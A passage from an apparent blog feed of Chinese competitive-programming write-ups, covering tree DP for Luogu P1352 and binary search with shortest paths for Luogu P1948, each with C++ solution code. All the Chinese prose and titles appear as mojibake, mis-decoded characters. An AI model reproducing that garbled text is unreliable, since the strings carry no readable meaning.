class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> å­—ç¬¦ä¸² </category>
          
          <category> KMP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ ‘å½¢dpçš„å­¦ä¹ </title>
      <link href="/2022/02/14/%E6%A0%91%E5%BD%A2dp%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/02/14/%E6%A0%91%E5%BD%A2dp%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>å¾ˆçƒ¦å•Šï¼Œæœ€è¿‘å¤ä¹ å›¾è®ºï¼Œè´¼è‰°éš¾ï¼Œå¾ˆå¤šé¢˜ç›®åŸºæœ¬å¤šå¤šå°‘å°‘éƒ½è¦ç”¨æ ‘å½¢dpã€‚è€Œæˆ‘ä¸“æ³¨äºæå›¾è®ºå’Œæ•°æ®ç»“æ„ï¼Œdpå®Œå…¨å°±æ˜¯ç•¥çŸ¥ä¸€äºŒï¼Œé€ƒé¿æ²¡æœ‰ç”¨ï¼Œä¸ä¼šå°±å»å­¦ï¼Œç¢°åˆ°å›°éš¾å°±å»é¢å¯¹ã€‚</p><span id="more"></span><p>æ ‘ä¸Šdpå…¶å®è·Ÿæ™®é€šçš„dpå·®ä¸å¤šï¼Œç”šè‡³ä¼šæ¯”æ™®é€šçš„dpå†™èµ·æ¥ç®€å•ï¼Œä½†æ˜¯å‰ææ˜¯è¦ç†è§£ã€‚</p><h3 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><p>æ´›è°·<a href="https://www.luogu.com.cn/problem/P1352">P1352</a>è¿™ä¸ªçœŸçš„æ˜¯å…¸ä¸­å…¸äº†ï¼Œæˆ‘çœ‹å‡ ä¹æ‰€æœ‰çš„æŠ€æœ¯åšå®¢éƒ½ä¼šæ‹¿è¿™ä¸ªå½“ä½œæ ‘å½¢dpçš„å…¥é—¨é¢˜ï¼Œé‚£æˆ‘ä¹Ÿä¸ä¾‹å¤–ã€‚</p><h4 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>æŸå¤§å­¦æœ‰ $n$ ä¸ªèŒå‘˜ï¼Œç¼–å·ä¸º $1\ldots n$ã€‚</p><p>ä»–ä»¬ä¹‹é—´æœ‰ä»å±å…³ç³»ï¼Œä¹Ÿå°±æ˜¯è¯´ä»–ä»¬çš„å…³ç³»å°±åƒä¸€æ£µä»¥æ ¡é•¿ä¸ºæ ¹çš„æ ‘ï¼Œçˆ¶ç»“ç‚¹å°±æ˜¯å­ç»“ç‚¹çš„ç›´æ¥ä¸Šå¸ã€‚</p><p>ç°åœ¨æœ‰ä¸ªå‘¨å¹´åº†å®´ä¼šï¼Œå®´ä¼šæ¯é‚€è¯·æ¥ä¸€ä¸ªèŒå‘˜éƒ½ä¼šå¢åŠ ä¸€å®šçš„å¿«ä¹æŒ‡æ•° $r_i$ï¼Œä½†æ˜¯å‘¢ï¼Œå¦‚æœæŸä¸ªèŒå‘˜çš„ç›´æ¥ä¸Šå¸æ¥å‚åŠ èˆä¼šäº†ï¼Œé‚£ä¹ˆè¿™ä¸ªèŒå‘˜å°±æ— è®ºå¦‚ä½•ä¹Ÿä¸è‚¯æ¥å‚åŠ èˆä¼šäº†ã€‚</p><p>æ‰€ä»¥ï¼Œè¯·ä½ ç¼–ç¨‹è®¡ç®—ï¼Œé‚€è¯·å“ªäº›èŒå‘˜å¯ä»¥ä½¿å¿«ä¹æŒ‡æ•°æœ€å¤§ï¼Œæ±‚æœ€å¤§çš„å¿«ä¹æŒ‡æ•°ã€‚</p><hr><p>å…¶å®æˆ‘è§‰å¾—è¿™ä¸ªè·Ÿæœ‰ä¾èµ–çš„èƒŒåŒ…é¢˜æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ï¼Œä¸é€šçš„æ˜¯ï¼Œä»–ä»¬ä¸æ˜¯ä¾èµ–ï¼Œè€Œæ˜¯äº’æ–¥ï¼Œé€‰äº†ä¸€ä¸ªäººä¹‹ååˆ™ä¸èƒ½é€‰å¦ä¸€ä¸ªäººã€‚è€Œä¾èµ–èƒŒåŒ…åˆ™æ˜¯é€‰äº†ä¸€ä¸ªåˆ™å¿…é¡»é€‰å¦å¤–ä¸€ä¸ªï¼Œå½“ç„¶å¦å¤–ä¸€ä¸ªæ²¡æœ‰è¿™ä¸ªé™åˆ¶ï¼Œå¦åˆ™ä¸¤ä¸ªç‰©å“ç›´æ¥åˆå¹¶ä¸€ä¸ªç‰©å“å•¦ã€‚</p><p>è¿™é‡Œå¾ˆæ˜æ˜¾å°±æ˜¯ $n$ ä¸ªäºº $n-1$ å¯¹å…³ç³»ï¼Œå¯ä»¥ç®—åšä¸€æ£µæ ‘ï¼Œä½†æ˜¯è¿™æ£µæ ‘æ˜¯æœ‰å‘çš„ï¼Œæœ€é¡¶çº§çš„é‚£ä¸ªä¸Šå¸å°±æ˜¯æ ‘æ ¹äº†ã€‚è¿™é‡Œæˆ‘ä»¬è‚¯å®šå¾—å…ˆå»ºä¸€ä¸ªæœ‰å‘å›¾æ¥ä¿å­˜è¿™ä¸ªå…³ç³»ï¼Œç„¶åæˆ‘ä»¬éœ€è¦è‡ªåº•å‘ä¸Šåˆ†æç­–ç•¥ã€‚å¯¹äºæ¯ä¸€ä¸ªå¶å­èŠ‚ç‚¹ï¼Œå®ƒä»¬æ²¡æœ‰ä¸‹çº§ï¼Œå¯¹ä»–ä»¬æ¥è¯´åªæœ‰å‚åŠ æˆ–è€…ä¸å‚åŠ ï¼Œè¿™é‡Œæˆ‘ä»¬è®¾ $dp[i][0]$ ä¸ºç¬¬ $i$ ä¸ªäººä¸æ¥å‚åŠ çš„æœ€ä¼˜è§£ï¼Œ$dp[i][1]$ ä¸ºç¬¬ $i$ ä¸ªäººæ¥å‚åŠ çš„æœ€ä¼˜è§£ï¼Œæ³¨æ„è¿™ä¸ªæœ€ä¼˜è§£æ˜¯å¯¹äºå®ƒä»¥åŠå®ƒçš„æ‰€æœ‰å­å­™èŠ‚ç‚¹çš„æœ€ä¼˜è§£ã€‚æˆ‘ä»¬å‡è®¾èŠ‚ç‚¹ $i$ æœ‰kä¸ªèŠ‚ç‚¹åˆ†åˆ«ä¸º $a_1,a_2\dots a_k$ ï¼Œé‚£ä¹ˆå¯ä»¥å†™å‡ºå¦‚ä¸‹çŠ¶æ€è½¬ç§»æ–¹ç¨‹ã€‚ </p><p>$dp[i][1]  = \sum _{x=1} ^{k} dp[a_x][0]$</p><p>$dp[i][0]  = \sum _{x=1} ^{k} \max(dp[a_x][0],dp[a_x][1])$</p><p>è¿™é‡Œå¾ˆæ˜æ˜¾ï¼Œå¯¹äºæœ¬äººä¸å‚åŠ ï¼Œé‚£ä¹ˆè‡ªå·±çš„ä¸‹å±å¯å‚åŠ å¯ä¸å‚åŠ ï¼Œä½†æ˜¯è‡ªå·±å‚åŠ äº†è‡ªå·±çš„ä¸‹å±ä¸€å®šä¸èƒ½å‚åŠ ï¼Œè€Œè‡ªå·±ä¸å‚åŠ é€‰æ‹©ä¸‹å±å‚åŠ è¿˜æ˜¯ä¸å‚åŠ ä¹Ÿæ˜¯é€‰å–æœ€ä¼˜ç»“æœçš„ï¼Œå› æ­¤èƒ½å¾—åˆ°ä¸Šé¢çš„çŠ¶æ€è½¬ç§»æ–¹ç¨‹ã€‚ç„¶åå°±æ˜¯æœ€åŸºæœ¬çš„æ ‘çš„æ“ä½œäº†ï¼šå»ºè¾¹ï¼Œæ‰¾æ ¹ï¼Œdfsï¼ŒçŠ¶æ€è½¬ç§»ï¼Œæœ€åç»“æœå°±æ˜¯ $\max(dp[root][1],dp[root][0])$ï¼Œæ‰€ä»¥è¿™é“é¢˜æ˜¯çœŸçš„å…¥é—¨é¢˜ã€‚</p><h4 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 6500</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[maxn];</span><br><span class="line"><span class="keyword">int</span> root[maxn],degree[maxn],cnt,n,dp[maxn][<span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    degree[y]++;</span><br><span class="line">    edge[++cnt].next=root[x];</span><br><span class="line">    edge[cnt].to=y;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[x];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">        <span class="built_in">dfs</span>(v);</span><br><span class="line">        dp[x][<span class="number">0</span>]+=<span class="built_in">max</span>(dp[v][<span class="number">1</span>],dp[v][<span class="number">0</span>]);<span class="comment">//çŠ¶æ€è½¬ç§»æ–¹ç¨‹</span></span><br><span class="line">        dp[x][<span class="number">1</span>]+=dp[v][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;dp[i][<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        <span class="built_in">add</span>(y,x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!degree[i])&#123;<span class="comment">//æ‰¾æ ¹</span></span><br><span class="line">            <span class="built_in">dfs</span>(i);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">max</span>(dp[i][<span class="number">1</span>],dp[i][<span class="number">0</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> å›¾è®º </category>
          
          <category> åŠ¨æ€è§„åˆ’ </category>
          
          <category> æ ‘å½¢dp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ´›è°·P1948é¢˜è§£</title>
      <link href="/2022/02/13/%E6%B4%9B%E8%B0%B7P1948%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/13/%E6%B4%9B%E8%B0%B7P1948%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.luogu.com.cn/problem/P1948">æ´›è°·P1948</a>é¢˜è§£ã€‚</p><span id="more"></span><h2 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p>å¤šå¹´ä»¥åï¼Œç¬¨ç¬¨é•¿å¤§äº†ï¼Œæˆä¸ºäº†ç”µè¯çº¿å¸ƒç½®å¸ˆã€‚ç”±äºåœ°éœ‡ä½¿å¾—æŸå¸‚çš„ç”µè¯çº¿å…¨éƒ¨æŸåï¼Œç¬¨ç¬¨æ˜¯è´Ÿè´£æ¥åˆ°éœ‡ä¸­å¸‚çš„è´Ÿè´£äººã€‚è¯¥å¸‚å‘¨å›´åˆ†å¸ƒç€$N(1&lt;=N&lt;=1000)$æ ¹æ®$1â€¦â€¦n$é¡ºåºç¼–å·çš„åºŸå¼ƒçš„ç”µè¯çº¿æ†ï¼Œä»»æ„ä¸¤æ ¹çº¿æ†ä¹‹é—´æ²¡æœ‰ç”µè¯çº¿è¿æ¥ï¼Œä¸€å…±æœ‰$p(1&lt;=p&lt;=10000)$å¯¹ç”µè¯æ†å¯ä»¥æ‹‰ç”µè¯çº¿ã€‚å…¶ä»–çš„ç”±äºåœ°éœ‡ä½¿å¾—æ— æ³•è¿æ¥ã€‚</p><p>ç¬¬iå¯¹ç”µçº¿æ†çš„ä¸¤ä¸ªç«¯ç‚¹åˆ†åˆ«æ˜¯$a_i,b_i$ï¼Œå®ƒä»¬çš„è·ç¦»ä¸º$l_i(1&lt;=l_i&lt;=1000000)$ã€‚æ•°æ®ä¸­æ¯å¯¹$(a_i,b_i)$åªå‡ºç°ä¸€æ¬¡ã€‚ç¼–å·ä¸º1çš„ç”µè¯æ†å·²ç»æ¥å…¥äº†å…¨å›½çš„ç”µè¯ç½‘ç»œï¼Œæ•´ä¸ªå¸‚çš„ç”µè¯çº¿å…¨éƒ½è¿åˆ°äº†ç¼–å·Nçš„ç”µè¯çº¿æ†ä¸Šã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç¬¨ç¬¨çš„ä»»åŠ¡ä»…ä»…æ˜¯æ‰¾ä¸€æ¡å°†1å·å’ŒNå·ç”µçº¿æ†è¿èµ·æ¥çš„è·¯å¾„ï¼Œå…¶ä½™çš„ç”µè¯æ†å¹¶ä¸ä¸€å®šè¦è¿å…¥ç”µè¯ç½‘ç»œã€‚</p><p>ç”µä¿¡å…¬å¸å†³å®šæ”¯æ´ç¾åŒºå…è´¹ä¸ºæ­¤å¸‚è¿æ¥kå¯¹ç”±ç¬¨ç¬¨æŒ‡å®šçš„ç”µè¯çº¿æ†ï¼Œå¯¹äºæ­¤å¤–çš„é‚£äº›ç”µè¯çº¿ï¼Œéœ€è¦ä¸ºå®ƒä»¬ä»˜è´¹ï¼Œæ€»è´¹ç”¨å†³å®šäºå…¶ä¸­æœ€é•¿çš„ç”µè¯çº¿çš„é•¿åº¦(æ¯æ ¹ç”µè¯çº¿ä»…è¿æ¥ä¸€å¯¹ç”µè¯çº¿æ†)ã€‚å¦‚æœéœ€è¦è¿æ¥çš„ç”µè¯çº¿æ†ä¸è¶…è¿‡kå¯¹ï¼Œé‚£ä¹ˆæ”¯å‡ºä¸º0.</p><p>è¯·ä½ è®¡ç®—ä¸€ä¸‹ï¼Œå°†ç”µè¯çº¿å¼•å¯¼éœ‡ä¸­å¸‚æœ€å°‘éœ€è¦åœ¨ç”µè¯çº¿ä¸ŠèŠ±å¤šå°‘é’±ï¼Ÿ</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>æœ‰ä¸€è¯´ä¸€ï¼Œä¸çœ‹é¢˜è§£æˆ‘æ˜¯ä¸‡ä¸‡æƒ³ä¸åˆ°çš„ï¼Œè¿™å¾—æ˜¯å¤šå‰å®³çŒœæƒ³å¾—åˆ°è¿™é¢˜æ˜¯ç”¨äºŒåˆ†å»è§£å†³çš„ã€‚ä¸è¿‡å¦‚æœèƒ½å‘ç°è¿™é¢˜çš„ç­”æ¡ˆçš„å•è°ƒæ€§ï¼Œä¹Ÿè®¸çœŸçš„å¯ä»¥å†™å‡ºæ¥ã€‚</p><p>é¦–å…ˆç¬¬ä¸€ç‚¹æˆ‘æƒ³çš„è‚¯å®šå°±æ˜¯æœ€çŸ­è·¯å•¦ï¼Œä½†æ˜¯æœ¬é¢˜ç›®æ±‚çš„å¹¶ä¸æ˜¯æœ€çŸ­è·¯ï¼Œä»”ç»†çœ‹ï¼Œå¦‚æœè·¯çº¿ä¸ªæ•°å°‘äº $k$ ä¸ªï¼Œåˆ™0å…ƒè´­ï¼Œå¦åˆ™å°†ä¼šå–å¾—æ‰€æœ‰è·¯çº¿çš„æœ€é•¿çš„ä¸€æ¡è·¯å¾„ä½œä¸ºè´¹ç”¨ã€‚å¯ä»¥çœ‹åˆ°è¿™ä¸ªé¢˜ç›®å®ƒå¹¶ä¸å…·å¤‡æ— åæ•ˆæ€§ï¼Œå®ƒå±äºæœ‰åæ•ˆæ€§ï¼Œæœ‰åæ•ˆæ€§å³å‰é¢åšå‡ºçš„é€‰æ‹©å¯¹ä¹‹åçš„é€‰æ‹©æœ‰å½±å“ï¼Œå¦‚æœé¢˜ç›®å°±æ˜¯æ±‚æ€»å…±çš„æœ€çŸ­è·¯é‚£ä¹ˆå®ƒå°±æ˜¯æ— åæ•ˆæ€§ã€‚å› ä¸ºæˆ‘å½“å‰åœ¨ä¸€ä¸ªç‚¹ä¸Šçš„æ—¶å€™ä½ ä¸éœ€è¦å»ç®¡æˆ‘æ€ä¹ˆåˆ°çš„è¿™ï¼Œå› ä¸ºå°±ä¸€ä¸ªæœ€çŸ­è·¯å¾„çš„å€¼åœ¨è¿™é‡Œï¼Œä¸ç®¡ä½ å‰é¢æ€ä¹ˆèµ°çš„è¿™ä¸ªå€¼æ˜¯ä¸ä¼šå½±å“åé¢çš„ç»“æœçš„ã€‚</p><p>é‚£ä¹ˆè¿™æ˜¯ä¸€ä¸ªæœ‰åæ•ˆæ€§çš„é¢˜ç›®é‚£æ€ä¹ˆåŠå‘¢ï¼Œç­”æ¡ˆæ˜¯äºŒåˆ†ã€‚</p><p>äºŒåˆ†çš„åˆ¤æ–­æ¡ä»¶å°±æ˜¯ï¼Œåœ¨æˆ‘é¢„ç®—ä¸ºmidçš„æ—¶å€™èƒ½å¦æˆåŠŸå»ºæˆï¼Œå¾ˆå®¹æ˜“å¯ä»¥æ‰¾åˆ°è§„å¾‹ï¼Œå¦‚æœmidèƒ½å»ºæˆï¼Œé‚£ä¹ˆ&gt;midçš„æƒ…å†µä¸€å®šèƒ½å»ºæˆï¼Œå¦‚æœmidä¸èƒ½å»ºæˆï¼Œé‚£ä¹ˆ&lt;midçš„æƒ…å†µä¸€å®šä¹Ÿä¸èƒ½å»ºæˆï¼Œä»¥æ­¤ä½œä¸ºäºŒåˆ†çš„ä¾æ®ã€‚æˆ‘ä»¬è·‘æœ€çŸ­è·¯çš„æ—¶å€™åªéœ€è¦æ£€æµ‹è·¯çº¿ä¸Šæœ‰å¤šå°‘ä¸ªè¶…è¿‡midçš„è¾¹å³å¯ï¼Œå¦‚æœè¶…è¿‡kï¼Œè¯´æ˜é¢„ç®—ä¸€å®šè¶…è¿‡midï¼Œå¦‚æœæ²¡åˆ°ï¼Œè¯´æ˜é¢„ç®—å¤ªå¤šäº†ï¼Œå¤§äºmidçš„ç­”æ¡ˆå°±éƒ½æ’é™¤äº†ï¼Œç„¶åæ¯æ¬¡äºŒåˆ†è·‘ä¸€æ¬¡å•æºæœ€çŸ­è·¯ã€‚åœ¨ $n=1000$ çš„æƒ…å†µä¸‹å¤æ‚åº¦å®Œå…¨å…è®¸ã€‚</p><p>å°±æ˜¯è¯´ï¼Œè¿˜å¾—å¤šç»ƒä¹ ï¼Œä¸ç„¶å®Œå…¨æƒ³ä¸åˆ°èƒ½ç”¨è¿™æ ·çš„æ–¹æ³•å»åšã€‚</p><p>æ ‡ç¨‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 5005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x3f3f3f3f</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; P;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn*maxn*<span class="number">2</span>];</span><br><span class="line"> <span class="keyword">int</span> n,m,k,cnt,root[maxn],d[maxn],vis[maxn];</span><br><span class="line"> priority_queue&lt;P,vector&lt;P&gt;,greater&lt;P&gt;&gt;s;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt].next=root[x];</span><br><span class="line">    edge[cnt].w=w;</span><br><span class="line">    edge[cnt].to=y;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bfs</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(d,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(d));</span><br><span class="line">    <span class="comment">//memset(vis,0,sizeof(vis));</span></span><br><span class="line">    d[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//vis[1]=1;</span></span><br><span class="line">    s.<span class="built_in">push</span>(&#123;<span class="number">0</span>,<span class="number">1</span>&#125;);</span><br><span class="line">    <span class="keyword">while</span>(!s.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">auto</span> p=s.<span class="built_in">top</span>();</span><br><span class="line">        s.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">int</span> point=p.second;</span><br><span class="line">        <span class="keyword">if</span>(d[point]&lt;p.first)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[point];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> to=edge[i].to;</span><br><span class="line">            <span class="keyword">if</span>(vis[to])<span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">//vis[to]=1;</span></span><br><span class="line">            <span class="keyword">if</span>(d[to]&gt;d[point]+(edge[i].w&gt;x?<span class="number">1</span>:<span class="number">0</span>))&#123;</span><br><span class="line">                <span class="comment">//vis[to]=1;</span></span><br><span class="line">                d[to]=d[point]+(edge[i].w&gt;x?<span class="number">1</span>:<span class="number">0</span>);</span><br><span class="line">                s.<span class="built_in">push</span>(&#123;d[to],to&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;mid=%d:d[n]=%d\n&quot;,x,d[n]);</span></span><br><span class="line"><span class="comment">//    for(int i=1;i&lt;=n;i++)&#123;</span></span><br><span class="line"><span class="comment">//        printf(&quot;%d &quot;,d[i]);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="comment">//putchar(10);</span></span><br><span class="line">    <span class="keyword">if</span>(d[n]==INF)<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(d[n]&gt;k)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P1948_2.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;k;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w);</span><br><span class="line">        <span class="built_in">add</span>(y,x,w);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> l=<span class="number">1</span>,r=<span class="number">1000000</span>,ans=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> value=<span class="built_in">bfs</span>(mid);</span><br><span class="line">        <span class="keyword">if</span>(value==<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(value==<span class="number">1</span>)&#123;</span><br><span class="line">            l=mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            r=mid<span class="number">-1</span>;</span><br><span class="line">            ans=mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> å›¾è®º </category>
          
          <category> æœ€çŸ­è·¯å¾„ </category>
          
          <category> algorithm </category>
          
          <category> äºŒåˆ† </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ZJCPC-D. Shortest Path Query</title>
      <link href="/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/</url>
      
